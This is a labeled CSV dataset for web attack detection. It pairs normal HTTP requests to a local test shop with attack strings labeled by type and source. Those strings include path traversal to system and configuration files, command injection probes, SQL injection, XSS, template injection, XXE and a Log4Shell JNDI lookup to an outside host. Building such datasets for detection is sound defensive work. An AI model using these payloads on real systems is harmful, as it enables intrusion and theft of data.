payload,label,source
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=holdaway&pwd=TAbuRETe&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=53277DA6F5E2268484E15C879C92CAF8 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=238FE4F45F6C0EB0397F3ECE70F31890 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
../../../../../../var/log/apache2/error_log%00,path_traversal,seclists
%20echo%20FKCLCN$((17%2B95))$(echo%20FKCLCN)FKCLCN//,command_injection,seclists
"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=11921A34DC73193C47683125A3A22D4E Connection: close",normal,csic_2010
@{var res=37*37;},ssti,augmented
modo=registro&login=lovejoy&password=calabr%E9s&nombre=Josefa&apellidos=Kukier+Policastro&email=askam%40maxtienda.er&dni=52930776W&direccion=Plza.+Leire%2C+1%2C+6%3FA&ciudad=Nerpio&cp=50236&provincia=Burgos&ntc=7659332695027336&B1=Registrar,normal,csic_2010
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0FA40F034B68D1D55F0DE2A5266ED474 Connection: close",normal,csic_2010
%5C..%5c%5C..%5c%5C..%5c%5C..%5c%5C..%5c%5C..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,path_traversal,payloads_all_the_things
modo=insertar&precio=7578&B1=Confirmar%2F,sqli,csic_2010
../../../../etc/http/httpd.conf,path_traversal,seclists
%5C..%255c%5C..%255c%5C..%255c%5C..%255c%5C..%255c%5C..%255cetc%255cissue,path_traversal,payloads_all_the_things
../../../boot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FE6A60DAC7DF9DF1493F315DF3C47C56 Connection: close",normal,csic_2010
%7C%20%5B%202%20-ne%20%24%28echo%20CDUKUS%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,command_injection,seclists
modo=%2520&precio=3571&B1=Pasar+por+caja,sqli,csic_2010
modo=registro&login=gareis&password=COgeDura&nombre=Zaida&apellidos=Bergas+Patraca&email=prucnalova.feher%40vilainstal.bo&dni=07319581S&direccion=Espigol+9%2C+&ciudad=Esplugues+de+Llobregat&cp=25344&provincia=Madrid&ntc=0513123892203870&B1=Registrar,normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mccormac&password=narra&nombre=Selva&apellidos=Marti+Maragliano&email=defauce%40farma-job.ro&dni=32099761H&direccion=Claveles+44%2C+10D&ciudad=Valdeavellano&cp=24206&provincia=Lleida&ntc=1180738044092526&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=32ED01718576F5795FC3C2DB13639218 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=07F45D48A77DE5F855430AB33481A976 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=01B73C67E058E6DDA9B49E04AF020B57 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif.java HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F314E8613E98E031B3712A0B0D8EADCC Connection: close",sqli,csic_2010
/var/log/apache/access_log,path_traversal,seclists
%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9006F19D17B7A07791706AA2205A9BF2 Connection: close",normal,csic_2010
../../../NetServer/bin/stable/apache/php.ini,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=2ECC127565C307C91296B74714EFAC1A Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jui6&password=hamaca&nombre=Adelqui&apellidos=Blaya+Varcarcel&email=bousen%40cumbareback.uk&dni=45388096B&direccion=C%2F+Virgen+De+Las+Cruces%2C+128%2C+12A&ciudad=Pineda+de+Gig%FCela&cp=24921&provincia=Ciudad+Real&ntc=630426169878945A&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4963D82DA3D36FEA69FA4B1B5179BD5C Connection: close",sqli,csic_2010
"Exploit String: a=""get"";&#10;b=""URL("""";&#10;c=""javascript:"";&#10;d=""alert('XSS');"")"";eval(a+b+c+d);",xss,seclists
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8A0223E2B49FAABB20C943CFDFD425E3 Connection: close",normal,csic_2010
modo=insertar&precio=4233&B1=Confirmar,normal,csic_2010
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=49A229F28EF56FCD6B8C111AF3C960D4 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
../../../../../../../../../../../../../../etc/http/conf/httpd.conf%00,path_traversal,seclists
{out*18},ssti,augmented
"<optgroup onbeforecopy=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
%7C%20%5B%206%20-ne%20%24%28echo%20MCLZRV%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C,command_injection,seclists
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=53722C038915C855959A8656549A6FB8 Connection: close",normal,csic_2010
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--",sqli,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=35A3972025A6792268DB6BA12CA8203A Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
../../../../../../../../../../../../../opt/lampp/logs/access.log%00,path_traversal,seclists
C:\Windows\diagnostics\index\devicediagnostic.xml,path_traversal,seclists
/etc/phpmyadmin/config.inc.php,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9B8D1110FD3FE60C93CFA7A9FE255D8A Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1501492FDC7D2D94D51D15C2F782AAA7 Connection: close",normal,csic_2010
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20GFPZMF%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20//,command_injection,seclists
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9D284EB3E0CE409AA5F1D10C7F7303E6 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=16DA5309210DFE4852826F7437168AB3 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3400&B1=Pasar+por+caja%2F HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5044AF75C0AA43B4263E1EC89FA35932 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=37CABD75803B361BFB5C7DDA7A8A91F7 Connection: close",normal,csic_2010
X-Forwarded-For: ${jndi:ldaps://burpcollab.net:1389/a},log4shell,augmented
&&echo$IFSPKOWIK$((48%2B16))$(echo$IFSPKOWIK)PKOWIK\,command_injection,seclists
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=862A91BB7E5BE60FDBB641C42E85E674 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F340733F2FEE79223D7A0AB0E11A177D Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
..\..\..\..\boot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0B2BE3953C3898FFBB8C18F1ADE918AE Connection: close",normal,csic_2010
%27%3Becho%20IKGCWR$((71%2B55))$(echo%20IKGCWR)IKGCWR%5C%5C,command_injection,seclists
%c0%5e%c0%5e%u2216boot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A3F824939C1385503413D76E58FBC753 Connection: close",normal,csic_2010
Author URL: http://sirdarckcat.net/,xss,seclists
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9FA24930A2BB677A314A17251CF97C9F Connection: close",normal,csic_2010
C:\Windows\System32\DriverStore\FileRepository\prnms001.inf_amd64_9e116340d71d6c05\mxdw-manifest.ini,path_traversal,seclists
?.%uEFC8?.%uEFC8?.%uEFC8boot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C77E362F1AA2E5D02F39010C176F5D06 Connection: close",normal,csic_2010
@(q*44),ssti,augmented
"${new URL(""http://www.google.com"").getText()}",ssti,payloads_all_the_things
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C85EF55ACF1AEC1A8E18913508E5752A Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
{q*3},ssti,augmented
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=92A1F201408761EACAC954DDE433BB69 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"`""'><img src=xxx:x \x2Fonerror=javascript:alert(2873)>",xss,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yokono5&pwd=yuntar&remember=off&B1A=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=B243E26155D40558DCC6A399FE18C307 Connection: close",sqli,csic_2010
%local_dtd;,xxe,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=robbert&pwd=5rgullecer&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=301A2C99D637617C472D0BD9294D3BC6 Connection: close",sqli,csic_2010
id=3&nombre=Vino+Rioja&precio=100&cantidad=37&B1=A%F1adir+al+carrito,normal,csic_2010
*{x*22},ssti,augmented
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=19B134412050AA5A8DE44205218304C5 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
..../%c0%2f..../%c0%2f..../%c0%2f..../%c0%2fetc%c0%2fpasswd,path_traversal,payloads_all_the_things
??%%32%%66??%%32%%66??%%32%%66??%%32%%66??%%32%%66??%%32%%66boot.ini,path_traversal,payloads_all_the_things
C:\Program Files\IceWarp\html\_shared\libs\htmlpurifier\configschema\schema\core.disableexcludes.txt,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=651472F35FDA8DBACED8D6AEE3A2F501 Connection: close",normal,csic_2010
"<rp onbeforecopy=""alert(1)"" contenteditable>test</rp>",xss,seclists
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0549CBD1FCA46E4BF0728725CC6D80DD Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
modo=insertar&precio=112&B1=Pasar+por+cajaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,sqli,csic_2010
modo=registro&login=%27+DELETE+FROM+USERS&password=restitutorio&nombre=HuilliManque&apellidos=Cure+Lozana&email=nathenson1%40sandrasummer.sy&dni=47051425A&direccion=C%2F+Lebrillo%2C+155%2C+4-A&ciudad=Olmedo+de+Camaces&cp=44589&provincia=Valladolid&ntc=6933033673510667&B1=Registrar,sqli,csic_2010
../../../../../usr/apache/conf/httpd.conf,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6982435BAFA29EC4686829AF351282F2 Connection: close",normal,csic_2010
